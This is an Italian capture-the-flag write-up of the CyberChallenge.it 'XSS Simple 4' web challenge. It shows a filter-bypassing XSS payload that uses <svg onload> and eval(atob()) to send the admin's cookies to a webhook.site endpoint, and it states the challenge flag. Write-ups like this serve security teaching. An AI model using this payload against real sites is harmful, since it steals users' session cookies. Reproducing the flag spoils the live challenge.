# Writeup: WS_3.04 - XSS Simple 4

## Overview
- **Categoria**: Web  
- **Autore**: bonaff  
- **Difficoltà**: 461  
- **Stato**: Up (last checked: 12 minutes ago)  
- **URL**: [http://xss4.challs.cyberchallenge.it/](http://xss4.challs.cyberchallenge.it/)

## Descrizione 📝
Siamo al quarto livello della serie **XSS Simple**. Come nelle challenge precedenti, dobbiamo sfruttare un form di “report” che l’admin visiterà. Il server tenta di filtrare e/o bloccare payload più comuni, ma possiamo ancora eseguire codice JavaScript sfruttando tecniche come:

- Tag `<svg>` con `onload`.
- Base64 + `eval(atob())` per aggirare i filtri su keyword JavaScript.

## Soluzione 🎯

### 1. Costruzione del Payload
Un esempio di payload “pulito” potrebbe essere:
```html
<svg onload="eval(atob('ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlL2JlZjVkMzIxLTUyYTMtNGEzZC04NzQxLTFmYTk1MGZhNTI3MCcsIHttZXRob2Q6ICdQT1NUJywgYm9keTogZG9jdW1lbnQuY29va2llfSk='))">
</svg>
```
- **`eval(atob(...))`**: Decodifica in Base64 il codice e lo esegue.
- **Codice Decodificato**: Esegue `fetch('https://webhook.site/bef5d321-52a3-4a3d-8741-1fa950fa5270', {method:'POST', body:document.cookie})`.

### 2. Inserimento e Segnalazione
Dopo aver generato il payload, costruiamo un URL di “report” (es. `?html=<svg...>`) e lo inviamo tramite il form presente nel sito. L’admin, aprendo il link, eseguirà lo script.

### 3. Raccolta della Flag
Sul nostro endpoint (Webhook.site), riceviamo il cookie dell’admin, contenente la flag:

## Flag 🏁
```
CCIT{8e498129556696f9a5c9ab1707464624}
```

## Lezioni Apprese 📚
1. **XSS Bypass Avanzato**: Usare `<svg onload>` è un vettore comune per eseguire JavaScript senza `<script>`.
2. **Base64 Evita Filtri**: `eval(atob(...))` è un metodo collaudato per superare blacklist di keyword.
3. **Importanza dei Filtri Lato Server**: Se non si sanitizza correttamente il contenuto, un attaccante può sempre trovare tecniche per eseguire JS arbitrario.

## Tools Utilizzati 🛠️
- **Browser**: Per testare l’URL e generare il payload.
- **Webhook.site**: Per ricevere la richiesta con il cookie dell’admin.
- **Base64 Encoder**: Per convertire il codice JS in Base64.

---

*Writeup by Luca Crippa - Last Updated: 2024*
